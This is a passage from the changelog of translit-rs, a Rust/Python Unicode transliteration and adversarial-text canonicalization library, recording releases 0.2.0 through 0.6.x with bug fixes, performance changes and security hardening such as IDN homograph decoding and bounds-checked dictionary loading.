  swap previously defeated the seal).
- **#103** — `decode_to_utf8` default confidence now actually gates (see notes).
- **#107** — a corrupt context dictionary now reports a distinct "corrupt" error
  instead of the misleading "not found" remedy (`DictState` enum).
- **#121** — `PRESETS["sanitize_user_input"]` now reflects the real pipeline
  order (strip invisibles before zalgo); Python registry and Rust doc aligned.
- **#129** — `Text.transliterate()` stub now declares the `tones`/`context`
  parameters the implementation accepts.
- **#131** — `Slugify(uids=...)` emits a correct wrong-class warning rather than
  a spurious deprecation warning.
- **#122** — disambiguated the `_compat` `should_warn` nested ternary.

### Security

- **#105** — added a `cargo audit` (RustSec advisory) CI job and a `cargo`
  Dependabot ecosystem.
- **#132** — added a Trivy CVE scan of the published image to the release
  workflow (SARIF → Security tab, fails on fixable HIGH/CRITICAL) + `.trivyignore`.
- **#106** — Rust diagnostics now route through Python `warnings` instead of
  bare `eprintln!`, so applications can capture/suppress them.

### Performance (output-preserving)

- **#108** codepoint-range diacritic checks in `tokenize()`; **#109** `mem::take`
  per token boundary; **#110** single `ch.nfkc()` pass on the NFKC fallback;
  **#111** lowered `MAX_CAPACITY_HINT` 256 MiB → 8 MiB; **#112/#113** emoji
  matching uses stack buffers + a fixed sliding window (no per-char `Vec`/`String`);
  **#114** slugify uses `Cow` (no eager `to_owned`); **#115** context `tokenize()`
  returns borrowed (`Cow`) slices of the input — zero per-token allocation
  (**Rust API:** the crate-internal `context::Token.text` changed from `String`
  to `Cow<'_, str>`; no effect on the Python API); **#116** clamped the
  `ContextDict` capacity hint.

### Maintenance

- **#118** implemented `slugify(save_order=True)`; **#119** `SlugConfig::from_pyargs`
  dedupes the four slugify PyO3 entrypoints; **#120** `_build_slug_kwargs` helper;
  **#123** seal-enforcement docs on each `tables::` mutator; **#124**
  infallibility comments; **#125** typed `_CallableModule.__call__` kwargs;
  **#126** corrected `recover_lock` doc; **#127** documented the lazy-import
  workaround; **#128** renamed `_mutation_generation` → `_registration_generation`;
  **#130** annotated the defence-in-depth conflict check.

## [0.6.1] — 2026-06-07

A bug-fix and test-hardening release. No public API was removed and no new
public names were added. **One fix changes key output for inputs containing
invisible characters** — see *Upgrade notes*.

### Upgrade notes (output-affecting fix)

- **`search_key` / `catalog_key` / `sort_key` now strip bidi overrides and
  soft-hyphen / format characters** (#93). Previously a value stored with an
  invisible character (e.g. `"pass\u00adword"`, `"user\u202etxt"`) produced a
  *different* key from its clean equivalent, so dedup and lookup silently
  missed. The new key is the correct one; if you persist these keys, regenerate
  any that were computed over text that could contain invisible characters.

### Fixed

- **#93** — key functions (`search_key`/`catalog_key`/`sort_key`) leaked bidi
  and soft-hyphen characters, so visually-identical inputs produced
  non-colliding keys. They now `strip_bidi` after NFKC, matching the other
  canonicalization presets.
- **#82** — Greek reverse transliteration (`transliterate(text, target="el")`)
  left literal Latin letters in the output (`"psychi"` → `"ψyχη"`). The forward
  direction romanizes Υ/υ as `Y`/`y` (including the ου/αυ/ευ diphthongs), so the
  `el` reverse table now maps `Y`/`y` back to Greek; round-trips no longer leak
  Latin letters.
- **#69** — `transliterate()` resolved conflicting kwargs differently for `str`
  vs `list` input (one path silently dropped `target`, the other `context`).
  Conflicts are now checked once, before the dispatch, so both raise identically:
  `context`+`target` and `context`+`tones` raise `ValueError`.
- **#72** — `translit.unidecode()` now mirrors the Unidecode 1.3 signature
  `unidecode(string, errors="ignore", replace_str="?")`, mapping Unidecode's
  `errors` modes (`ignore`/`replace`/`preserve`/`strict`) onto the native error
  handling, instead of raising `TypeError` on those kwargs.
- **#95** — Greek Extended polytonic **capitals** for omicron/upsilon/omega/rho
  were corrupted, emitting unrelated Latin letters (`Ὅμηρος` → `Xmiros`,
  `Ὑγίεια` → `Pgieia`). Corrected all 50 affected entries to the proper base
  romanization, consistent with the monotonic forms (`Ὅμηρος` → `Omiros`).
- **#99.3** — a typo'd `form=`/`errors=` value now raises even for pure-ASCII
  input. Previously the ASCII fast-path returned before reaching Rust, so the
  bad enum silently no-opped on ASCII and only raised on the first non-ASCII
  string. Validation now runs before the fast-path in `normalize()` and
  `transliterate()`.

### Performance

- **#70** — the batch entry points (`transliterate`, `slugify`, `normalize`,
  `strip_accents` on `list[str]`) now **release the GIL** around their pure-Rust
  compute loop via `py.allow_threads`. Multi-threaded callers processing large
  batches now get real parallelism (~1.8× wall-clock with two threads) instead
  of serialising on the interpreter lock. Output is unchanged. Documented in the
  new "Concurrency (GIL)" section of `docs/performance.md`.

### Documentation

- **#94** — `strict_iso9` is no longer described as "ISO 9:1995". It emits ASCII
  digraphs (ж→zh, ч→ch, ш→sh), not the standard's diacritics (ž/č/š) — translit
  tables are ASCII-only by design. Docstrings, the data-file header, and the docs
  now describe it as a scholarly ASCII (ISO 9-style) transliteration and warn it
  is not ISO 9-conformant. No behavior change.
- **#98** — `docs/user-guide/transliteration.md` no longer instructs users to
  `pip install translit-rs[arabic|hebrew|context]` (those empty extras were
  removed in 0.6.0); it now documents the `bootstrap_dicts.sh` / `TRANSLIT_DICT_DIR`
  path, matching the README and the runtime error message.
- **#99.1 / #99.2** — fixed two false docstrings: `sort_key` no longer claims to
  preserve accents (it folds them via transliteration, coinciding with
  `search_key`), and `slugify` no longer documents a `pretranslate` kwarg it
  never had.

- **#84** — corrected the README throughput table (Cyrillic ~106M chars/sec,
  slugify ~712K slugs/sec on commodity 4-vCPU hardware) and added a
  hardware/methodology footnote; added a matching variance note to
  `docs/performance.md`.
- **#77** — fixed the `Text` fluent-builder docstring example (`normalize` is
  keyword-only: `.normalize(form="NFC")`), reconciled the language-profile count
  (README now agrees with the docs at 83), and documented the `context` kwarg in
  the `transliterate()` docstring.

### Internal / tests

- **#78** — added adversarial coverage for the raw-bytes decode path
  (`detect_encoding` / `decode_to_utf8`): deterministic hostile-byte cases in
  CI plus a Hypothesis `st.binary()` fuzz suite proving no-panic and
  invariant-preservation. Documented in `THREAT_MODEL.md` that the decode path
  has no input-size cap (caller's responsibility, per the 0.6.0 cap removal).
- **#79** — added a single-vs-batch kwarg parity regression test across the full
  kwarg matrix and a multi-script corpus (the `tones` batch drop fixed in 0.6.0
  can no longer recur silently).

## [0.6.0] — 2026-06-07

A hardening and bug-fix release. Two new opt-in helpers (`dedup_batch`,
`make_cached_transliterator`) make this a **minor** bump; no public API was
removed. **Several fixes change output for specific inputs** — read *Upgrade
notes* before upgrading if you cache or persist transliterator/normalizer output.

### Upgrade notes (output-affecting fixes)

Each of these was a bug; the new output is the correct one. If you store or cache
results that were keyed on the old (buggy) behaviour, regenerate them:

- **`register_replacements()` now actually applies.** It was a silent no-op — the
  registered table was never consulted. Registered replacements now take effect
  across `transliterate()` (scalar, list, and `context=True`). If you registered
  replacements and (knowingly or not) relied on them being ignored, output changes.
- **`transliterate(list, tones=True)`** now returns toned pinyin (was silently
  toneless on the list path); **`transliterate(list, target=…, tones=True)`** now
  raises `ValueError` for the forward-only parameter (was silently ignored).
- **`normalize_confusables(text, target="cyrillic")`** no longer maps characters
  onto *invisible combining marks* (28 such mappings removed).
- **`strip_obfuscation`** now folds intra-Latin ASCII homoglyphs (`þ→p`, `ſ→f`,
  `ı→i`, …) and is idempotent; **`sanitize_user_input`** is idempotent for
  control/invisible characters between combining marks; **`demojize`** no longer
  inserts a stray space after a tab/newline that precedes an emoji.
- **Context-aware transliteration (`context=True`, ar/fa/he) distribution
  changed.** The empty `arabic`/`hebrew`/`context` pip extras have been **removed**
  (they never installed anything). The ~37 MB dictionaries are no longer tracked
  in git, and are not shipped in the wheel. Context mode now loads dictionaries
  from `$TRANSLIT_DICT_DIR` (build them with `scripts/bootstrap_dicts.sh`), or use
  the `embed-dicts` Cargo feature for a self-contained build. A packaged
  pip-installable distribution is tracked in #56/#60.
- **`decode_to_utf8` default `min_confidence` changed `0.0` → `0.5`.** Low-confidence
  encoding guesses are now rejected by default instead of silently accepted; pass
  `min_confidence=0.0` to restore the old behaviour. (#66)
- **Unknown `lang` codes now raise instead of silently falling back** (#68). A
  typo'd code (`lang="RU"`, `lang="russian"`) used to behave exactly like
  `lang=None` — quietly-wrong output — while `errors=`/`form=` rejected bad
  values. `transliterate`, `slugify`, `sanitize_filename`, `catalog_key`,
  `search_key`, `sort_key`, and `ml_normalize` now raise `TranslitError` listing
  the valid codes. `"auto"`, the `nb`/`nn`/`da` aliases, and `register_lang()`
  codes are accepted. (`target=` already validated.)

### Changed
- **No library-imposed input-size limit** (#80, #65). The 10 MiB input cap on
  `transliterate`, `normalize`, `fold_case`, and the preset pipelines has been
  **removed** — it was paternalistic, inconsistently applied (the ASCII fast
  path bypassed it; `slugify`/`normalize_confusables`/`strip_zalgo` never had it),
  and the threat model already disclaims DoS. All operations are linear time and
  memory; **bounding untrusted input is the caller's responsibility**, documented
  in the threat model and docstrings. The single retained size guard is the
  `register_replacements` output amplification bound (a tiny input can expand to
  an enormous string via a caller-registered value — an amplification a caller's
  own input check cannot foresee). Backward-compatible: only previously-rejected
  large inputs now succeed.
- **External wording: capability, not promise.** Security-relevant features are now
  described as mechanisms (TR39 confusable *mapping*, bidi/zalgo *stripping*, hostname
  *analysis*) rather than outcome guarantees. Package descriptions, README, and docs no
  longer claim to "prevent"/"neutralize" attacks or achieve "perfect" recovery; the XMR
  benchmark figure is always stated with its tested-pairs scope. Engineering rigor is held
  to a high internal bar (see below); the external surface promises nothing it cannot
  measure.

### Added
- **`dedup_batch(texts, …)`** — transliterate a list, processing each *distinct*
  value once and mapping back (large win for repeated/categorical data; ~146× on a
  high-locality column). Stateless — no cache to invalidate; unique values are chunked
  at the 100k batch cap. (#31)
- **`make_cached_transliterator(maxsize=…, …)`** — opt-in LRU-cached single-string
  transliterator with options fixed at construction. **Self-invalidating**: the next
  call after any `register_lang`/`register_replacements`/`remove_replacement`/
  `clear_replacements` clears the cache (via an internal table-generation counter), so
  it never serves stale results. Never enabled by default. (#31)
- **`THREAT_MODEL.md`** — defines in-scope mechanisms, explicit out-of-scope items
  (confusables outside the bundled TR39 table, whole-script and multi-character
  confusables, Unicode-version skew, semantic attacks, DoS), and a vulnerability-vs-
  known-limitation policy, grounded in the literature (Holgers 2006, Deng 2020,
  BitAbuse 2025).
- `SECURITY.md` rewritten on real footing: supported-version policy stated, triage
  scope defined, and linked to the threat model.
- **Security-invariant property tests + fuzzing.** `proptest` invariants in Rust
  (`src/presets.rs`) assert no-panic, idempotence, and "no bidi/format control
  survives" for `strip_obfuscation` / `security_clean` / `sanitize_user_input` /
  `strip_bidi` across the Unicode input space; a deterministic, CI-gating
  adversarial **attack-corpus regression** (`tests/test_attack_corpus.py`:
  homoglyph / zalgo / invisible / bidi / combined, XMR-style); and a **`cargo-fuzz`
  harness** (`fuzz/`) for continuous coverage-guided fuzzing of the defense
  pipelines.
- **Confusable coverage for intra-Latin homoglyphs of basic ASCII letters**
  (e.g. `þ→p`, `ſ→f`, `ı→i`, `ƒ→f`, `Ɩ→l`, `ꜱ→s`). The TR39 generator previously
  skipped all Latin-script sources for the Latin target, dropping ~83 genuine
  homoglyphs of A–Z/a–z; `normalize_confusables`/`strip_obfuscation` now fold
  them. Single-letter Latin confusable coverage of UTS#39 is now complete.
- Pinned `data/confusables.txt` (UTS#39 17.0.0) as the reproducible, version-
  controlled input for `scripts/gen_confusables.py` (`--download` refreshes it),
  and a `tests/test_confusable_coverage.py` gate against Unicode-version drift.

### Fixed
- **`register_replacements()` was a silent no-op** — the global table was stored
  but never consulted by `transliterate()`. It now applies as a longest-match
  pre-pass (no cascade) across the scalar, list, and `context=True` forward paths,
  including ASCII-keyed replacements that previously bypassed Rust via the Python
  fast path. (#51)
- **`tones=` on the list/batch path** was dropped: `transliterate(["北京"],
  tones=True)` returned toneless pinyin while the scalar path returned toned, and
  `transliterate([...], target=…, tones=True)` silently ignored the forward-only
  parameter instead of raising. Both now match the scalar path. (#14, #15)
- **`normalize_confusables(target="cyrillic")` emitted invisible combining marks** —
  28 mappings folded a visible character onto a combining Cyrillic-Extended mark (an
  obfuscation vector). The generator now excludes combining-mark targets. (#24)
- **`script_info("CanadianAboriginal")["context_aware"]` raised `KeyError`** — the
  entry omitted a required `ScriptMeta` field; a completeness guard now prevents
  recurrence. (#18)
- **Context path skipped `strict_iso9`/`gost7034` mutual-exclusion validation** —
  `transliterate(text, context=True, strict_iso9=True, gost7034=True)` now raises
  `ValueError` like the non-context path; the missing-dictionary error hint is now
  language-specific (`he`→`hebrew`). (#18)
- **`demojize` inserted a stray space** after a tab/newline preceding an emoji
  (`"a\t😀"` → `"a\t grinning face"`); it now checks for any whitespace. (#12)
- **Compatibility digit variants fold to digits, not letters** (#89). The
  confusables table mapped Mathematical Alphanumeric digits `𝟎`/`𝟏` (and the
  other four families, plus superscripts) to the look-alike letters `O`/`l`, so
  `normalize_confusables("𝟏𝟎")` gave `"lO"` and `strip_obfuscation` corrupted
  digit runs. The generator now folds any character whose NFKC form is an ASCII
  digit to that digit. They remain *detected* as confusable (`is_confusable`),
  but canonicalize to the correct number. (ASCII `0`/`1` were already unaffected.)
- **NFKC-compatible Latin is recovered instead of dropped to `[?]`** (#81).
  Mathematical Alphanumeric Symbols (`𝕳𝖊𝖑𝖑𝖔 𝟙𝟚𝟛` → `Hello 123`), presentation
  ligatures (`ﬁ`/`ﬂ` → `fi`/`fl`), and superscripts (`x²` → `x2`) now
  transliterate: an unmapped non-ASCII char is NFKC-decomposed and re-tried
  before the error fallback. This matches unidecode/anyascii and closes a
  filter-evasion ("fancy text") gap. Purely additive — only chars that were
  previously `[?]` are affected; emoji (no ASCII decomposition) still map to `[?]`.
- **Defense pipelines are now idempotent** (bugs found by the property tests):
  - `strip_obfuscation`: emoji whose CLDR name contains typographic punctuation
    (e.g. `👒` → `woman’s hat`, U+2019 `’`) weren't folded because confusables ran
    *before* demojize; a second pass folded `’`→`'`. Confusables now runs after demojize.
  - `sanitize_user_input`: an invisible *or control* character between combining
    marks (e.g. soft-hyphen, NUL) split a mark-run, so removing it *after*
    zalgo-capping merged runs that a second pass then capped differently. Bidi,
    zero-width, **and control characters** are now stripped *before* zalgo-capping.
- Build-time and doc corrections: `build.rs` now rejects malformed `\u{…}` escapes
  in TSV data; embedded-dictionary parse errors are logged (not silently dropped);
  and numerous stale docstrings/comments were corrected (`script_to_lang` returns
  ISO 639-1 *or* 639-3; `normalize()` ASCII fast-path; list single-Rust-call caveats).

### Security
- **`seal_registrations()` / `registrations_sealed()`** (#64, high). The
  `register_lang`/`register_replacements` APIs mutate *process-global* tables
  consulted by every `transliterate`/`slugify`/`catalog_key`/… call, so in a
  multi-tenant or web process one import or request handler could silently alter
  everyone's canonicalization. `seal_registrations()` is a one-way latch: after
  it is called, register/remove/clear raise `TranslitError`. The registration
  APIs are now documented as startup-only/single-writer. Separately, a poisoned
  lock no longer **resets** registrations to defaults (a panic in one thread
  could previously wipe another caller's registered languages) — it now recovers
  the data as-is.
- **`is_safe_hostname` now decodes IDN/`xn--` labels** (#63, high). Previously an
  `xn--` ACE label was pure ASCII → single-script → reported **safe**, so the
  on-the-wire form of the IDN homograph attack (a Cyrillic `xn--80ak6aa92e.com`
  "apple" spoof) sailed through — the exact blind spot for a library marketing
  `idn`/`anti-spoofing`. ACE labels are now UTS#46-decoded (via the `idna` crate)
  before script/confusable analysis; a malformed ACE label is treated as unsafe.
  Non-`xn--` labels are untouched (no false positives on, e.g., `my_host.local`).
- **`is_safe_hostname` fails closed** (#67.1). A confusable-check error no longer
  silently degrades to "not confusable" (`unwrap_or(false)`) → "safe"; it now
  marks the hostname unsafe.
- **`strip_bidi`/`display_clean` now also strip deprecated format controls
  (U+206A–U+206F) and interlinear annotation marks (U+FFF9–U+FFFB)** (#67.2),
  which were previously only handled as transliteration-table entries.
- **NFKC×confusables composition pinned** (#67.3). Added a regression test fixing
  the exact set of NFKC-ASCII results that `normalize_confusables` re-maps
  (`` ` ``→`'`, `"`→`''`, `|`→`l`) so a data/ordering change — e.g. reintroducing
  digit→letter — fails loudly; and that presets resolve NFKC/TR39 conflicts
  (`ſ`→`s`) via NFKC.
- **Context dictionaries are no longer loaded from a CWD-relative path** (#61).
  `load_dict_from_fs` previously probed `./data/{name}_dict.bin` *first*, so a
  process whose working directory an attacker influences (or where they can drop
  `./data/`) could inject a substitute dictionary and silently change ar/fa/he
  output. Dictionaries now load only from `$TRANSLIT_DICT_DIR` (explicit opt-in)
  or the crate's own absolute `data/` path in source builds.
- **Supply-chain: corpus inputs are verified/pinned** (#62). The Tashkeela corpus
  archive is now checksum-verified before it feeds the builders (fail-closed — an
  unpinned checksum aborts unless `ALLOW_UNVERIFIED_CORPUS=1`), and the Project
  Ben Yehuda corpus is fetched at a pinned commit instead of an unpinned live HEAD.
- **`ContextDict::from_bytes` is fully bounds-checked.** A malformed or truncated
  context dictionary previously caused an out-of-bounds **panic** (the crate is
  `unsafe_code = forbid`, so a panic aborts the process). Every read is now
  bounds-checked and section offsets are validated; capacity hints are clamped.
  Added truncation/bogus-offset/`u32::MAX`-count unit tests. (#18)
- **`register_replacements` expansion is bounded.** Replacement *values* are
  caller-controlled and unbounded; a small input with a large value could expand
  past the transliterate input cap. Output is now bounded during construction and
  rejected once it would exceed `MAX_TRANSLITERATE_INPUT_BYTES`. (#51)

### Internal / tests
- **170 deterministic tests were excluded from CI.** A module-level
  `pytestmark = pytest.mark.hypothesis` in `test_filename_regressions.py` and
  `test_case_folding.py` (filename-security and case-folding regressions) deselected
  the *entire* files under CI's `-m "not hypothesis"` filter; only ~10 were actual
  property tests. The mark is now scoped to the property-test class in each file, so
  the deterministic tests run in CI. (#12)
- New tests: `register_replacements` (unit + Hypothesis property), context-dict
  parser robustness, `resolve_auto_lang` for all 18 scripts added in v0.3.0+, and a
  `SCRIPT_META` field-completeness guard.
- CI/workflow hygiene: concurrency group on secret-scan, `uv.lock` in the benchmark
  path filter, and CodeQL no longer triggered by Rust-only changes.

## [0.5.0] — 2026-06-06

### Added
- **Context-aware transliteration** for abjad scripts (Arabic, Persian, Hebrew).
  `transliterate(text, context=True)` uses dictionary-based vowel restoration
  with bigram context disambiguation to produce readable romanized text instead
  of consonant skeletons.
  - **Arabic**: Tashkeela corpus (65.7M words), 182K unigrams + 200K bigrams.
    Covers 99%+ of newspaper vocabulary.
  - **Hebrew**: Project Ben Yehuda corpus (11.4M words), 227K unigrams + 200K
    bigrams. Covers literary Hebrew.
  - **Persian**: 266 curated common words + optional Wiktionary expansion
    (14.9K entries available via harvester script).
- **`list_context_langs()`**: returns language codes that support `context=True`
  (currently `["ar", "fa", "he"]`).
- **`LangMeta.context`** field: `"full"`, `"partial"`, or `"none"` — enables
  web/WASM clients to show/hide a context toggle per language.
- **`ScriptMeta.context_aware`** field: `bool` — enables toggle per detected script.
- **Dictionary build tooling**:
  - `scripts/build_arabic_dict.py` — corpus-based Arabic dictionary builder
  - `scripts/build_hebrew_dict.py` — corpus-based Hebrew dictionary builder
  - `scripts/build_persian_dict.py` — curated vocabulary Persian builder
  - `scripts/harvest_wiktionary_persian.py` — Wiktionary Persian harvester
  - `scripts/bootstrap_dicts.sh` — reproducible bootstrap from zero with
    pinned checksums. All parameters auditable, no manual steps.
- **Abjad transliteration documentation** (`docs/user-guide/abjad-transliteration.md`)
  covering all three languages, standards used, comparison with other systems.
- **pip extras**: `pip install translit-rs[arabic]`, `[hebrew]`, `[context]`
  for optional context dictionary installation.
- Rust context engine (`src/context.rs`): binary dictionary reader, Arabic/Hebrew
  tokenizer, three-tier resolve (bigram → unigram → context-free fallback),
  lazy-loaded global singletons via `OnceLock`.
- 28 context-aware tests (8 Arabic, 14 Persian, 6 Hebrew).

### Changed
- **Repositioning (docs + metadata only — no API or coverage changes).** The project
  now leads with its differentiated, proven core: **Unicode adversarial-text defense
  and canonicalization** (TR39 visual confusable mapping), with standards-based
  Latin/Cyrillic/Greek transliteration as the supporting pillar and CJK/Indic/other
  scripts framed as best-effort, unidecode-compatible coverage.
  - Rewrote the package description, keywords, and classifiers (added `Topic :: Security`)
    across `pyproject.toml`, `Cargo.toml`, and `mkdocs.yml` to surface the security
    use case for discovery.
  - Restructured `README.md` / `docs/index.md` to lead with defense; introduced an
    explicit three-tier coverage model (core / compatibility / best-effort).
  - Added an Adversarial-Text Defense guide (`docs/security/adversarial-defense.md`)
    documenting the phonetic-vs-visual distinction, the XMR metric, and benchmark
    evidence; elevated security to a top-level docs navigation section.
  - Reframed the Unidecode migration guide: the `unidecode` alias is for romanization
    compatibility, not security (it cannot reverse homoglyph attacks).

### Fixed
- **Linux x86_64 wheels are now built as `cp39-abi3`** instead of a version-specific
  `cp38-cp38` wheel. Previously the only published x86_64 Linux wheel targeted CPython
  3.8, so `pip` fell back to a source build (requiring a Rust toolchain) on Linux
  x86_64 for Python 3.9+. The publish workflow now pins the build interpreter and
  guards against the regression. (#26)
- Documentation: corrected the built-in language-profile count (inconsistently
  reported as 64 in one place; now consistently 83), and fixed several homoglyph code
  examples whose expected output was wrong (e.g. leading-character ordering in
  `strip_obfuscation` examples). All README/doc examples are now verified against the
  built library.

### Security
- Pinned all third-party GitHub Actions to commit SHAs across the CI and release
  workflows (resolves the CodeQL `actions/unpinned-tag` findings) and added
  `.github/dependabot.yml` to keep them current. This hardens the release pipeline,
  which uses PyPI trusted publishing (`id-token: write`).
- Bumped dev/docs dependencies flagged by Dependabot:
  [Pygments → 2.20.0](https://github.com/advisories/GHSA-5239-wwwm-4pmq) and
  [pytest → 9.0.3](https://github.com/advisories/GHSA-6w46-j5rx-g56g) (the pytest
  bump applies on Python ≥ 3.10; Python 3.9 stays on pytest 8.4.2, since pytest 9
  requires ≥ 3.10). Both are development-only — the package has no runtime
  dependencies.

### Notes
- No public API, language registry, or script coverage was removed. All existing
  imports, language codes, and the pinned API surface are unchanged.

## [0.4.0] — 2026-03-29

### Added
- **`strip_obfuscation()` preset pipeline**: maximum-strength text deobfuscation
  using TR39 confusable mapping (visual similarity). Neutralizes homoglyph spoofing,
  zalgo abuse, invisible character injection, and bidi attacks. Does NOT transliterate
  — chain with `transliterate()` explicitly if romanization is also needed.
  Pipeline: NFKC → strip_zalgo(max_marks=0) → confusables → strip_bidi →
  strip_zero_width → demojize → strip_accents → fold_case → collapse_whitespace.
- **`lang_info()` and `script_info()` APIs**: return structured metadata (display
  name, script, region) for any language code or script. Backed by `LANG_META` (83
  entries) and `SCRIPT_META` (55 entries) with import-time drift assertions.
- **18 new language codes**: ban (Balinese), bax (Bamum), bug (Buginese), chr
  (Cherokee), cjm (Cham), cop (Coptic), khb (Tai Lue), lis (Lisu), mni (Meitei),
  nod (Northern Thai), nqo (N'Ko), sat (Santali), su (Sundanese), syr (Syriac),
  tdd (Tai Le), tl (Tagalog), tzm (Tamazight), vai (Vai). Total: 83 languages.
- **10 new Script enum members**: Bamum, Buginese, Cham, Lisu, MeeteiMayek, OlChiki,
  Sundanese, Tagalog, TaiTham, Tifinagh. Total: 57 scripts.
- **Transliteration provenance documentation** (`docs/provenance.md`): per-block
  audit of which formal romanization standard each Unicode block follows.
- **API surface stability tests** (`tests/test_api_stability.py`): 133 tests
  locking down function signatures, class methods, enum members, TypedDicts,
  protocol interfaces, and `__all__` exports.
- **Mutation testing survivor killers** (`tests/test_mutant_killers.py`): 92 tests
  targeting forward-only parameter validation, default parameter sensitivity,
  pipeline step tuples, and boundary checks.
- **Language consistency audit** (`scripts/audit_language_consistency.py`): checks 11
  registration points for Rust/Python/docs/test alignment. Wired into pre-push gate.
- 283 empty-string mappings for combining marks and zero-width characters in
  `translit_default.tsv` — these are now silently stripped instead of producing `[?]`.
- `docs/index.md` is now generated from `README.md` via `scripts/generate_docs_index.sh`
  — single source of truth, no more drift.

### Fixed
- **`strip_obfuscation()` homoglyph resolution**: used phonetic transliteration
  (Cyrillic р→r, с→s) instead of TR39 visual confusable mapping (р→p, с→c).
  Removed transliterate from the pipeline; confusables now handles homoglyphs.
- **Combining marks produce `[?]`**: `transliterate("n\u0303")` returned `"n[?]"`
  instead of `"n"`. Added empty-string TSV mappings for all Combining Diacritical
  Marks (U+0300–U+036F), Extended (U+1AB0–U+1AFF), Supplement (U+1DC0–U+1DFF),
  Symbols (U+20D0–U+20F0), and Half Marks (U+FE20–U+FE2F).
- **Zero-width characters produce `[?]`**: `transliterate("a\u200Bb")` returned
  `"a[?]b"`. Added empty-string mappings for ZWS, ZWNJ, ZWJ, word joiner, BOM,
  soft hyphen, bidi marks, and line/paragraph separators.
- **`TextPipeline` confusable ordering**: confusables ran before transliterate,
  creating mixed-script gibberish on Cyrillic/Greek input. Swapped execution order
  so transliterate runs first (matching `catalog_key` preset).
- **`demojize()` adjacent emoji concatenation**: `demojize("🔥🔥")` returned
  `"firefire"` instead of `"fire fire"`. Added space padding between adjacent
  emoji-to-text replacements.
- **SCRIPT_RANGES sort order**: MeeteiMayek Extensions was misplaced, breaking
  binary search for Ethiopic Extended-A. Added `test_script_ranges_sorted` invariant.
- **Tibetan incorrectly documented as Wylie**: actual mappings use Indic-phonetic
  romanization (ཅ→cha, not Wylie's ca).

### Changed
- **BREAKING: `transliterate_batch()`, `slugify_batch()`, `normalize_batch()`, and
  `strip_accents_batch()` removed.** The base functions now accept both `str` and
  `list[str]` via `@typing.overload`. Pass a list to get batch processing:
  `transliterate(["café", "naïve"])` → `["cafe", "naive"]`.
- **BREAKING: `strip_obfuscation()` no longer transliterates.** Uses TR39 confusables
  (visual mapping) instead. `lang=` parameter removed. Chain with `transliterate()`
  explicitly if romanization is also needed.
- CI restructured: lint/test on PRs only (not push-to-main), hypothesis tests
  excluded (~4s vs ~46s), CodeQL moved to workflow file with path filtering,
  benchmarks split to own workflow.
- Pinned `ruff==0.15.4` in CI and `pyproject.toml` to prevent format drift.
- Python 3.9 remains a supported runtime (`requires-python = ">=3.9"`, abi3-py39)
  but was removed from the release CI matrix; CI runs on Python 3.10+ because
  tests use PEP 604 (`X | Y`) syntax without `from __future__ import annotations`.

## [0.3.0] — 2026-03-28

### Added
- **Unicode coverage expansion**: 2,553 new codepoints across 33 Unicode blocks,
  bringing total `translit_default.tsv` entries from 6,633 to 9,186.

  **Tier 1 — Forms and extensions (~1,741 codepoints):**
  - Fullwidth ASCII (FF01–FF5E): 94 characters, mechanical offset mapping
  - Halfwidth Hangul (FFA0–FFDC): 66 characters via compatibility jamo
  - Enclosed/Circled Alphanumerics (2460–24FF): 160 characters (①→1, Ⓐ→A)
  - Superscript/Subscript (2070–209F): 29 characters mapped to base forms
  - Roman Numerals (2160–2188): 41 characters (Ⅰ→I, Ⅱ→II, ... Ⅻ→XII)
  - Modifier Letters (02B0–02FF): 80 characters (ʰ→h, ʷ→w)
  - IPA/Phonetic Extensions (0250–02AF): 96 characters (ɑ→a, ʃ→sh, ŋ→ng)
  - Greek Extended (1F00–1FFF): 233 characters (polytonic → base Greek → Latin)
  - Hangul Jamo (1100–11FF): 256 individual jamo components
  - Kangxi Radicals (2F00–2FD5): 214 radical forms → pinyin via CJK decomposition
  - CJK Compatibility Ideographs (F900–FAFF): 472 characters → pinyin via
    canonical decomposition targets

  **Tier 2 — Living scripts (~812 codepoints):**
  - Gap-filling for 7 partially-covered scripts: Balinese, Canadian Syllabics,
    Cherokee, Coptic, N'Ko, Syriac, Vai
  - 10 new abugida scripts with virama/inherent-vowel handling: Sundanese,
    Tai Tham, Cham, Batak, Buginese, Tagalog, Hanunoo, Buhid, Tagbanwa,
    Meetei Mayek
  - 4 new alphabetic/syllabic scripts: Tifinagh, Lisu, Ol Chiki, Bamum

- Unicode range constants for 12 new scripts in `src/unicode_ranges.rs`:
  `SUNDANESE`, `TAI_THAM`, `CHAM`, `BATAK`, `BUGINESE`, `TAGALOG`, `HANUNOO`,
  `BUHID`, `TAGBANWA`, `MEETEI_MAYEK`, `MEETEI_MAYEK_EXT`.
- 10 new `*_char_role()` functions in `src/transliterate.rs` for abugida
  virama handling (Sundanese, Tai Tham, Cham, Batak, Buginese, Tagalog,
  Hanunoo, Buhid, Tagbanwa, Meetei Mayek).
- `scripts/generate_unicode_expansion.py`: reproducible generator script for
  all Tier 1 and Tier 2 TSV entries (1,310 lines).
- `cargo-clippy` pre-commit hook mirroring CI `-D warnings` to catch lints
  before push.
- **Callable module**: `import translit; translit("Москва", lang="auto")` now
  works as a shorthand for `translit.transliterate(...)`. Uses in-place
  `__class__` mutation to preserve `unittest.mock.patch` compatibility.

### Fixed
- **Finnish transliteration**: removed incorrect alias `fi→sv`. Finnish ä/ö
  are independent phonemes (→a/o via default table), not ae/oe variants as
  in Swedish/German. `Hämäläinen` now correctly produces `Hamalainen`.
- **Icelandic transliteration**: removed incorrect ð→dh and Ð→Dh overrides.
  Default table already maps ð→d (ICAO/passport standard). Retained Æ→Ae
  override (differs from default AE). Icelandic override count reduced from
  6 to 2.
- clippy `manual_range_patterns` lint in `buginese_char_role`: collapsed
  `0x1A17 | 0x1A18 | 0x1A19..=0x1A1B` to `0x1A17..=0x1A1B`.
- **`errors="preserve"` dropping visible characters**: characters with explicit
  empty-string TSV mappings (e.g. U+060E Arabic Poetic Verse Sign, U+30FC
  Katakana Prolonged Sound Mark) are now preserved instead of silently dropped
  when `errors="preserve"` is set.

### Changed
- `is_indic()` and `indic_char_role()` expanded to cover all 11 new
  Brahmic/abugida script ranges.
- `lookup_lang()`: Finnish no longer dispatches to Swedish override table;
  falls through to default.
- Icelandic language TSV (`translit_lang_is.tsv`) reduced from 6 to 2 entries.
- `ml_normalize` preset: switched transliteration from `Preserve` to `Ignore`
  error mode — ML pipelines need clean ASCII output, not preserved non-ASCII.

## [0.2.0] — 2026-03-27

### Added
- **Exhaustive testing framework** — three layers of machine-verifiable assurance:
  - **Compile-time assertions** (`build.rs`): all transliteration table values asserted
    ASCII-only, entry count sanity checks (Hanzi ≥20k, BMP ≥5k, confusables ≥1k).
